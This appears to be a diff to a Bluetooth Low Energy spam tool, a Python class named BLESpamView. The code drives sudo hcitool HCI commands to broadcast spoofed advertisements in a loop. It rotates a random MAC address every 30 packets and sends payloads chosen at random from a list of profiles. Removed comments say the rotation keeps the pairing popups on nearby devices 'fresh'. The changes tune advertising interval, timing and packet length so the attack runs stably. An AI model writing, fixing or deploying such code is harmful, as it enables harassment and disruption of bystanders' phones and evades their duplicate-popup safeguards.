@@ -86,17 +86,18 @@ class BLESpamView:
             # 1. Bring interface up and stop advertising
             subprocess.run(["sudo", "hciconfig", iface, "up"], capture_output=True)
             subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "00"], capture_output=True)
-            time.sleep(0.1)
+            time.sleep(0.2)
 
-            # 2. Set Advertising Parameters (20ms interval, non-connectable)
-            subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x0006", "20", "00", "20", "00", "03", "00", "00", "00", "00", "00", "00", "00", "00", "00", "07", "00"], capture_output=True)
+            # 2. Set Advertising Parameters (100ms interval, stable)
+            # a0 00 = 160 * 0.625ms = 100ms
+            subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x0006", "a0", "00", "a0", "00", "03", "00", "00", "00", "00", "00", "00", "00", "00", "07", "00"], capture_output=True)
 
             while not self._stop_event.is_set():
-                # Randomize MAC every 50 packets to keep popups fresh
-                if self.packets_sent % 50 == 0:
+                # Randomize MAC every 30 packets
+                if self.packets_sent % 30 == 0:
                     subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "00"], capture_output=True)
                     mac = [random.randint(0, 255) for _ in range(6)]
-                    mac[0] |= 0xC0 # Static Random requirement
+                    mac[0] |= 0xC0
                     mac_str = " ".join(f"{b:02x}" for b in mac)
                     subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x0005"] + mac_str.split(), capture_output=True)
                     subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "01"], capture_output=True)
@@ -108,24 +109,21 @@ class BLESpamView:
                     profile_data = random.choice(actual_profiles)[1]
 
                 # 3. Set Advertising Data
-                # Convert bytes to hex string for hcitool
+                # Full 32-byte packet: [Total Length] [Data...]
                 hex_data = " ".join(f"{b:02x}" for b in profile_data)
-                # Pad to 31 bytes
                 pad_count = 31 - len(profile_data)
                 if pad_count > 0:
                     hex_data += " " + " ".join(["00"] * pad_count)
                 
-                # Length byte (e.g., 1e for 30 bytes of data)
-                len_hex = f"{len(profile_data):02x}"
-                
-                cmd = ["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x0008", len_hex] + hex_data.split()
+                # Length of the ADV data section (usually 1e for 31 bytes)
+                cmd = ["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x0008", "1f"] + hex_data.split()
                 subprocess.run(cmd, capture_output=True)
                 
-                # Re-enable advertising to ensure the update sticks
+                # Start
                 subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "01"], capture_output=True)
                 
                 self.packets_sent += 1
-                time.sleep(0.1)
+                time.sleep(0.2)
 
             # Cleanup
             subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "00"], capture_output=True)
